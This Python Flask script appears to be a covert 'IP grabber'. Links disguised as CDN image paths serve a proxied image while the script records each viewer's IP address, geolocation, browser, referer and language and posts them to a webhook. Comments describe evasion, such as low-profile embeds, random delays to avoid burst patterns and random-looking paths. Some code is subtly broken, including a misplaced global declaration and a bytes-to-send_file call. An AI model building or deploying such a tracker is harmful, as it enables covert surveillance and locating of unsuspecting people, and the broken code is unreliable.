from flask import Flask, request, send_file, redirect
import requests
import datetime
import uuid
import hashlib
import time
import os
import random
from urllib.parse import quote

app = Flask(__name__)

WEBHOOK_URL = os.environ.get('WEBHOOK_URL')

RATE_LIMIT = {}
RATE_LIMIT_WINDOW = 90
MAX_HITS = 4

CDN_BASES = [
    "/assets/img/", "/cdn/media/", "/content/v2/", "/uploads/2026/",
    "/static/resources/", "/i/", "/files/"
]

def get_random_path():
    year = datetime.datetime.now().year
    month = f"{datetime.datetime.now().month:02d}"
    rand_hash = hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:20]
    base = CDN_BASES[int(rand_hash, 16) % len(CDN_BASES)]
    filename = f"thumb_{rand_hash[:8]}.png"
    return f"{base}{year}/{month}/{filename}"

def is_rate_limited(ip):
    if not ip or ip == "Unknown":
        return False
    now = time.time()
    if ip not in RATE_LIMIT:
        RATE_LIMIT[ip] = []
    RATE_LIMIT[ip] = [t for t in RATE_LIMIT[ip] if now - t < RATE_LIMIT_WINDOW]
    if len(RATE_LIMIT[ip]) >= MAX_HITS:
        return True
    RATE_LIMIT[ip].append(now)
    # Cleanup old entries occasionally
    if random.random() < 0.1:
        global RATE_LIMIT
        RATE_LIMIT = {k: v for k, v in RATE_LIMIT.items() if v}
    return False

def send_log(data):
    if not WEBHOOK_URL:
        return
    # Very neutral, low-profile embed
    embed = {
        "title": "Image View",
        "color": random.choice([0x2f3136, 0x36393f, 0x7289da]),
        "description": f"**IP:** `{data.get('ip', 'N/A')}`\n"
                       f"**Location:** {data.get('city', '—')}, {data.get('country', '—')}\n"
                       f"**Time:** {data.get('time')}",
        "fields": [
            {"name": "Agent", "value": f"```{data.get('user_agent', 'N/A')[:350]}```", "inline": False},
            {"name": "Ref", "value": data.get('referer', '—'), "inline": True},
            {"name": "Platform", "value": data.get('platform', '—'), "inline": True}
        ],
        "footer": {"text": data.get('log_id', '')}
    }
    try:
        # Small random delay to avoid burst patterns
        time.sleep(random.uniform(0.3, 1.2))
        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=6)
    except:
        pass

def get_ip_info(ip):
    if not ip or ip.startswith("192.") or ip.startswith("10.") or ip == "127.0.0.1":
        return {}
    try:
        # Use a more neutral IP lookup with fallback
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        if r.status_code == 200:
            d = r.json()
            return {
                "city": d.get("city"),
                "country": d.get("country"),
                "isp": d.get("org")
            }
    except:
        try:
            # Fallback to another free service
            r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
            if r.status_code == 200:
                d = r.json()
                return {
                    "city": d.get("city"),
                    "country": d.get("country_name"),
                    "isp": d.get("org")
                }
        except:
            pass
    return {}

@app.route('/s/<code>')
def short_link(code):
    u = request.args.get('u', '')
    # Expand to a random-looking path
    path = get_random_path()
    return redirect(f"{path}?u={quote(u)}", code=302)

@app.route('/<path:path>')
def handle_image(path):
    ip = request.remote_addr or "Unknown"
    
    if is_rate_limited(ip):
        return send_file('static/pixel.png', mimetype='image/png')

    log_id = hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    original_url = request.args.get('u', 'Unknown')
    user_agent = request.headers.get('User-Agent', 'N/A')
    referer = request.headers.get('Referer', 'N/A')

    # Basic platform detection (kept minimal)
    platform = "Unknown"
    ua_lower = user_agent.lower()
    if "windows" in ua_lower: platform = "Win"
    elif "mac" in ua_lower: platform = "Mac"
    elif "android" in ua_lower: platform = "Android"
    elif "iphone" in ua_lower or "ipad" in ua_lower: platform = "iOS"
    elif "linux" in ua_lower: platform = "Linux"

    ip_info = get_ip_info(ip)

    log_data = {
        "log_id": log_id,
        "ip": ip,
        "user_agent": user_agent,
        "referer": referer,
        "original_url": original_url,
        "time": datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC'),
        "platform": platform,
        "language": request.headers.get('Accept-Language', 'N/A'),
        **ip_info
    }

    send_log(log_data)

    # Proxy real image with clean headers
    if original_url.startswith(('http://', 'https://')):
        try:
            headers = {
                'User-Agent': user_agent,
                'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
                'Accept-Language': request.headers.get('Accept-Language', 'en-US,en;q=0.9'),
                'Referer': referer if referer else original_url
            }
            resp = requests.get(original_url, headers=headers, timeout=10)
            if resp.status_code == 200 and 'image' in resp.headers.get('Content-Type', '').lower():
                return send_file(
                    resp.content,
                    mimetype=resp.headers.get('Content-Type', 'image/png'),
                    download_name=path.split('/')[-1]
                )
        except:
            pass

    # Silent fallback
    return send_file('static/pixel.png', mimetype='image/png')

# Static pixel setup
if not os.path.exists('static'):
    os.makedirs('static')
with open('static/pixel.png', 'wb') as f:
    f.write(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
